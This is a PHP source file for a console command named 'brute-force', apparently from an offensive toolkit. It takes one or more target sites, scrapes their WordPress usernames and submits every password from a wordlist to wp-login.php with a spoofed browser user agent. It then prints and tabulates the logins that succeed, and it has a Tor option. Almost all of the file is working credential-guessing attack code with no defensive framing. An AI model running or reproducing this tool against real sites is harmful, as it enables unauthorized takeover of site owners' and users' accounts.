<?php
namespace Avenger\Controller;

use Knp\Command\Command;
use Symfony\Component\Console\Event\ConsoleExceptionEvent;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;
use Symfony\Component\Console\Input\InputArgument;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Input\InputDefinition;
use Symfony\Component\Console\Helper\Table;
//use Symfony\Component\Finder\Finder;
use Symfony\Component\Console\Helper\ProgressBar;
use Respect\Validation\Validator as v;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Cookie\CookieJarInterface;
use GuzzleHttp\Message\Response;
use Aszone\WordPress\WordPress;
use Mmoreram\Extractor\Filesystem\TemporaryDirectory;
use Mmoreram\Extractor\Resolver\ExtensionResolver;
use Mmoreram\Extractor\Extractor;


class BruteForceController extends Command{

	protected function configure() {
        $this
          	->setName("brute-force")
          	->setDescription("Brute force online single site or list of site")            
			->setDefinition(
                new InputDefinition(array(
                    new InputArgument(
                    	'type',
                    	InputArgument::REQUIRED,
                    	'What type? Example:  anywhere ,wordpress , joomla , drupal'),
                    new InputArgument(
                        'target',
                        InputArgument::REQUIRED,
                        'What target? Example: http://www.target.com, /home/foo/listOfTargets.txt'),
                    new InputOption(
                        'username',
                        'u',
                        InputOption::VALUE_REQUIRED,
                        'What username?. Example: admin, or /home/foo/usernamelist.txt'),
                    new InputOption(
                        'wordlist',
                        'w',
                        InputOption::VALUE_REQUIRED,
                        'List of password. Example: /home/foo/wordlist.lst'),
                    
                   	new InputOption(
                    	'tor',
                    	null,
                    	InputOption::VALUE_NONE,
                    	'Set the hash. Example: --tor'),
                   	
                    /*new InputOption(
                    	'hashs',
                    	'hss',
                    	InputOption::VALUE_REQUIRED,8/
                    	'Set the file with list of hashs. Example: --hashs=/home/foo/hashs.lst'),*/
                
                ))
            )			
            ->setHelp('<comment>Command used to brute force</comment>');
    }

    protected function execute(InputInterface $input, OutputInterface $output) {
    	
        switch ($input->getArgument('type')) {
            case 'wordpress':
                $this->executeBruteForceWordPress($input, $output);
                break;
            case 'list-md5':
                $this->executeListMd5($input, $output);
                break;
            /*case 'joomla':
                $this->executeMd5($input, $output);
                break;
            case 'list-joomla':
                $this->executeMd5($input, $output);
                break;
            */
            default:
                //throw new ComponentException('Cannot validate without filter flag');
                $output->writeln("<error>This is 'Type' is not exist, select md5, list-md5</error>");
                break;
        }
    	
    }

    /**
     * @param InputInterface $input
     * @param OutputInterface $output
     */
    protected function executeBruteForceWordPress(InputInterface $input, OutputInterface $output){

        //$wordlistClass = new Wordlist();
        //$dataBruteForceWordPress = new \StdClass;
        $target      = $input->getArgument('target');
        $username    = $input->getOption('username');
        $wordlist    = $input->getOption('wordlist');

        if(empty($wordlist)){
            $zip = new \ZipArchive;
            $zip->open('resource/wordlist.zip');
            $zip->extractTo('resource/tmp/');
            $zip->close();
            $wordlist    = 'resource/tmp/wordlist.txt';
        }


        $resultFinal = array();

        //$targetIsUrl    = v::url()->notEmpty()->validate($target);
        $targetIsList   = v::file()->notEmpty()->validate($target);
        $wordlistIsList = v::file()->notEmpty()->validate($wordlist);

        if($targetIsList && $wordlistIsList){


            // READ FILE LISTS OS PASSOWRDS AND HASHS
            $arrWordlist = file($wordlist,FILE_IGNORE_NEW_LINES);
            $arrTarget   = file($target,FILE_IGNORE_NEW_LINES);
            unlink($wordlist);

            //CONFIG PROFRESSBAR
            $progress = new ProgressBar($output, count($arrWordlist)*count($arrTarget) );
            $progress->setBarCharacter('<comment>=</comment>');
            $progress->setFormat('verbose');
            $progress->setProgressCharacter('|');
            $progress->setBarWidth(100);
            $progress->setRedrawFrequency(50);
            $progress->start();

            foreach ($arrTarget as $keyTarget => $valueTarget) {

                $output->writeln(""); 
                $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");

                $wp = new WordPress();
                $usernames= array();
                //VERIFY IF EXIST USER ESPECIFY, IF CASE NOT, LIST USER OF WORDPRESS
                if(empty($username)){
                    $output->writeln("<info>Searching for users, wait...</info>");
                    //VERIFY IF LIST TXT OR SEARCH IN WORDPRESS SITE
                    $usernames=$wp->getUsers($valueTarget);
                }else{
                    $usernames[]=$username;

                }
                $output->writeln("<info></info>");
                $output->writeln("<info>".count($usernames)." of users...</info>");


                $isWordPress=$wp->isWordPress($valueTarget);
                $baseUrlWordPress=$wp->getBaseUrlWordPressByUrl($valueTarget);
                if($isWordPress){
                    if(!empty($usernames)){
                        foreach($usernames as $username){
                            $output->writeln("<info>Search password of ".$username."</info>");
                            foreach ($arrWordlist as $keyWordList => $valueWordList) {

                                $progress->advance();
                                $returnHtml=$this->sendDataToLoginWordPress($username,$valueWordList,$baseUrlWordPress);

                                $validateLogon=$this->validateLogon($returnHtml);

                                if($validateLogon){

                                    $resultFinal[$keyTarget]['target']=$valueTarget;
                                    $resultFinal[$keyTarget]['username']=$username;
                                    $resultFinal[$keyTarget]['Password']=$valueWordList;

                                    $output->writeln("");
                                    $output->writeln("<info>Login success</info>");
                                    $output->writeln("<info>Target: ".$valueTarget."</info>");
                                    $output->writeln("<info>Username: ".$username."</info>");
                                    $output->writeln("<info>Password: ".$valueWordList."</info>");
                                    break;
                                }

                            }
                        }
                    }else{
                        $output->writeln("<error>Users not found...</error>");
                    }

                }else{
                    $output->writeln("<error>This site is not WordPress...</error>");
                }


            }
        }else{
            $output->writeln("<error>A SE FAZER AINDA</error>");
        }
        $progress->finish();

        //PRINT RESULT LIST FINAL
        $output->writeln("");
        $table = new Table($output);
        
        $table->setHeaders(array('TARGET','USERNAME', 'PASSWORD'));
                   
        $table->setRows($resultFinal);
        $table->render();
        
        
    }

    protected function sendDataToLoginWordPress($username,$password,$target){



            /*$client 	= new Client(['base_url' => $target]);
            //$jar = new CookieJar();
            $options = [
                'config' => [
                    'curl' => [
                        //'CURLOPT_URL'=>$target . 'wp-login.php',
                        'CURLOPT_RETURNTRANSFER'=> 1,
                        'CURLOPT_REFERER' => $target . 'wp-login.php',
                        'CURLOPT_COOKIEFILE' => 'cookie.txt',
                        'CURLOPT_COOKIEJAR'=>'cookie.txt',
                        'CURLOPT_POST' => 1,

                    ],
                ],
                'body' => [
                    'log' => $username,
                    'pwd' => $password,
                    'wp-submit' => 'Log In',
                    'redirect_to' => $target.'wp-admin/&testcookie=1',
                ],
                'headers' => [
                    'User-Agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6',
                ],
                //'cookies' => $jar,
                'debug' => true,


            ];
            $resultSend = $client->post( $target.'wp-login.php', $options);


            return $resultSend->getBody()->getContents();
        */
        //return false;

        $cookie="cookie.txt";

        $postdata = "log=". $username ."&pwd=". $password ."&wp-submit=Log%20In&redirect_to=". $target ."wp-admin/&testcookie=1";
        $ch = curl_init();
        curl_setopt ($ch, CURLOPT_URL, $target . "wp-login.php");
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt ($ch, CURLOPT_REFERER, $target . "wp-admin/");
        curl_setopt ($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata);
        curl_setopt ($ch, CURLOPT_POST, 1);
        $result = curl_exec ($ch);
        curl_close($ch);
        //var_dump($result);
        return $result;

    }

    protected function validateLogon($html){
        
        //preg_match("/<strong>(.+?)<\/strong>/", $html, $resultMatches, PREG_OFFSET_CAPTURE, 3);

        $pos = strpos($html, "<strong>ERRO</strong>");
        if($pos !== false){
           return false;
        }
        return true;
    }


    /*
    $username="lenon";
    $password="123";
    $url="http://localhost/wp112015/";
    $cookie="cookie.txt";

    $postdata = "log=". $username ."&pwd=". $password ."&wp-submit=Log%20In&redirect_to=". $url ."wp-admin/&testcookie=1";
    $ch = curl_init();
    curl_setopt ($ch, CURLOPT_URL, $url . "wp-login.php");
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt ($ch, CURLOPT_REFERER, $url . "wp-admin/");
    curl_setopt ($ch, CURLOPT_COOKIEFILE, $cookie);
    curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata);
    curl_setopt ($ch, CURLOPT_POST, 1);
    $result = curl_exec ($ch);
    curl_close($ch);
    echo $result;
    */

}